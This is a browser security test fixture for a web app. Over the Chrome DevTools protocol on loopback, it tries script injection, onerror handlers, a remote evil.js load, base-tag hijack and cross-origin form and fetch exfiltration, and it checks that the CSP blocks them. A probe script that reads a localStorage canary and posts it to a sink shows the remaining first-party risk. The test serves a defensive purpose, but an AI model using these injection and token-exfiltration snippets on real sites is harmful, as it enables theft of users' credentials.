// Loopback-only attack fixture. Synthetic canary, no student data or real Supabase credentials.
// Requires a production build and a test Chromium with CDP on 127.0.0.1:9222.
import assert from 'node:assert/strict'
import { createServer } from 'node:http'
import { readFile, writeFile, mkdir } from 'node:fs/promises'
import { resolve, extname } from 'node:path'
const builtHtml = await readFile('dist/index.html', 'utf8')
const entryPath = /<script[^>]+src="([^"]+)"/.exec(builtHtml)?.[1] || ''
const basePath = entryPath.slice(0, entryPath.lastIndexOf('/assets/') + 1) || '/'
const dist = resolve('dist'),
  checks = []
let sink = false,
  untrustedRequests = 0
const untrusted = createServer((_req, res) => {
  untrustedRequests++
  res.setHeader('Access-Control-Allow-Origin', '*')
  res.setHeader('Content-Type', 'text/javascript')
  res.end('globalThis.remoteScriptRan=true;')
})
const server = createServer(async (req, res) => {
  let path = new URL(req.url, 'http://localhost').pathname
  if (basePath !== '/' && path.startsWith(basePath)) path = '/' + path.slice(basePath.length)
  res.setHeader('Cache-Control', 'no-store')
  if (path === '/_probe.js') {
    res.setHeader('Content-Type', 'text/javascript')
    res.end("fetch('/_sink',{method:'POST',body:localStorage.getItem('classon-security-canary')})")
    return
  }
  if (path === '/_sink') {
    let body = ''
    for await (const chunk of req) body += chunk
    sink = body === 'synthetic-test-token'
    res.end('ok')
    return
  }
  if (path === '/_frame') {
    res.setHeader('Content-Type', 'text/html')
    res.end('<!doctype html><iframe src="/index.html"></iframe>')
    return
  }
  const file = resolve(dist, '.' + (path === '/' ? '/index.html' : path))
  if (!file.startsWith(dist + '/')) {
    res.writeHead(404)
    res.end()
    return
  }
  try {
    const bytes = await readFile(file)
    res.setHeader(
      'Content-Type',
      { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript', '.css': 'text/css' }[
        extname(file)
      ] || 'application/octet-stream',
    )
    res.end(bytes)
  } catch {
    res.writeHead(404)
    res.end()
  }
})
const listen = (s) =>
  new Promise((r, j) => {
    s.once('error', j)
    s.listen(0, '127.0.0.1', r)
  })
await listen(server)
await listen(untrusted)
const origin = `http://127.0.0.1:${server.address().port}`,
  other = `http://127.0.0.1:${untrusted.address().port}`
let ws, target
const delay = (ms) => new Promise((r) => setTimeout(r, ms))
try {
  target = await (
    await fetch('http://127.0.0.1:9222/json/new?' + encodeURIComponent('about:blank'), {
      method: 'PUT',
    })
  ).json()
  ws = new WebSocket(target.webSocketDebuggerUrl)
  await new Promise((r, j) => {
    ws.addEventListener('open', r, { once: true })
    ws.addEventListener('error', j, { once: true })
  })
  let id = 0
  const pending = new Map()
  ws.addEventListener('message', (e) => {
    const m = JSON.parse(e.data)
    if (m.id) {
      pending.get(m.id)?.(m)
      pending.delete(m.id)
    }
  })
  const call = (method, params = {}) =>
    new Promise((r, j) => {
      const i = ++id
      const timer = setTimeout(() => {
        pending.delete(i)
        j(Error('CDP timeout: ' + method))
      }, 10000)
      pending.set(i, (m) => {
        clearTimeout(timer)
        m.error ? j(Error(m.error.message)) : r(m.result)
      })
      ws.send(JSON.stringify({ id: i, method, params }))
    })
  const evaluate = async (expression) => {
    const r = await call('Runtime.evaluate', {
      expression,
      returnByValue: true,
      awaitPromise: true,
    })
    if (r.exceptionDetails) throw Error(r.exceptionDetails.text)
    return r.result.value
  }
  await call('Page.enable')
  await call('Runtime.enable')
  await call('Page.navigate', { url: new URL(basePath, origin + '/').href })
  let text = ''
  for (let n = 0; n < 50; n++) {
    await delay(100)
    text = await evaluate('document.body.innerText')
    if (text.includes('처음 오셨나요')) break
  }
  assert(text.includes('처음 오셨나요'), 'production app must render under CSP')
  checks.push({ scenario: 'production_render', result: 'pass' })
  assert(
    (await evaluate(
      'document.querySelectorAll(\'meta[http-equiv="Content-Security-Policy"]\').length',
    )) === 1,
  )
  await evaluate(
    `(()=>{const s=document.createElement('script');s.textContent='globalThis.inlineAttackRan=true';document.head.append(s)})()`,
  )
  await delay(100)
  assert(!(await evaluate('globalThis.inlineAttackRan===true')))
  checks.push({ scenario: 'inline_script_injection', result: 'blocked' })
  await evaluate(
    `(()=>{const i=document.createElement('img');i.setAttribute('onerror','globalThis.attributeAttackRan=true');i.src='/_missing.png';document.body.append(i)})()`,
  )
  await delay(150)
  assert(!(await evaluate('globalThis.attributeAttackRan===true')))
  checks.push({ scenario: 'inline_event_handler', result: 'blocked' })
  const outbound = await evaluate(
    `fetch(${JSON.stringify(other + '/sink')},{method:'POST',body:'synthetic-only'}).then(()=>true,()=>false)`,
  )
  assert.equal(outbound, false)
  assert.equal(untrustedRequests, 0)
  await evaluate(
    `(()=>{const s=document.createElement('script');s.src=${JSON.stringify(other + '/evil.js')};document.head.append(s)})()`,
  )
  await delay(150)
  assert.equal(untrustedRequests, 0)
  assert(!(await evaluate('globalThis.remoteScriptRan===true')))
  checks.push({ scenario: 'untrusted_origin_script_and_fetch', result: 'blocked' })
  const base = await evaluate('document.baseURI')
  await evaluate(
    `(()=>{const b=document.createElement('base');b.href=${JSON.stringify(other + '/')};document.head.prepend(b)})()`,
  )
  assert.equal(await evaluate('document.baseURI'), base)
  checks.push({ scenario: 'base_url_replacement', result: 'blocked' })
  await evaluate(
    `(()=>{const f=document.createElement('form');f.action=${JSON.stringify(other + '/form')};f.method='POST';document.body.append(f);f.submit()})()`,
  )
  await delay(150)
  assert.equal(untrustedRequests, 0)
  checks.push({ scenario: 'cross_origin_form_exfiltration', result: 'blocked' })
  // Deliberately simulate a malicious first-party script. CSP permits this trust boundary.
  await evaluate("localStorage.setItem('classon-security-canary','synthetic-test-token')")
  await evaluate(
    "(()=>{const s=document.createElement('script');s.src='/_probe.js';document.head.append(s)})()",
  )
  for (let i = 0; i < 30 && !sink; i++) await delay(50)
  assert(sink, 'expected residual first-party compromise must be demonstrated, not hidden')
  await evaluate("localStorage.removeItem('classon-security-canary')")
  checks.push({
    scenario: 'compromised_first_party_script_reads_browser_token',
    result: 'residual_risk_reproduced',
  })
  await call('Page.navigate', { url: origin + '/_frame' })
  let child = ''
  for (let i = 0; i < 40; i++) {
    await delay(50)
    child = await evaluate("document.querySelector('iframe')?.contentDocument?.body?.innerText||''")
    if (child.includes('보안을 위해')) break
  }
  assert(child.includes('보안을 위해'), 'framed entry must refuse initialization')
  checks.push({ scenario: 'iframe_clickjacking_entry', result: 'refused_initialization' })
  for (const width of [390, 1440]) {
    await call('Emulation.setDeviceMetricsOverride', {
      width,
      height: 900,
      deviceScaleFactor: 1,
      mobile: false,
    })
    await call('Page.navigate', { url: new URL(basePath, origin + '/').href })
    await delay(350)
    assert(!(await evaluate('document.documentElement.scrollWidth>innerWidth')))
  }
  checks.push({ scenario: 'security_page_responsive_layout', result: 'pass' })
  await mkdir('artifacts', { recursive: true })
  await writeFile(
    'artifacts/security-browser.json',
    JSON.stringify(
      {
        scope: 'loopback production build, synthetic canary only',
        time: new Date().toISOString(),
        checks,
      },
      null,
      2,
    ) + '\n',
  )
  for (const c of checks) console.log(`${c.result}: ${c.scenario}`)
} finally {
  ws?.close()
  if (target?.id) await fetch('http://127.0.0.1:9222/json/close/' + target.id).catch(() => {})
  for (const s of [server, untrusted]) {
    s.closeAllConnections()
    s.close()
  }
}
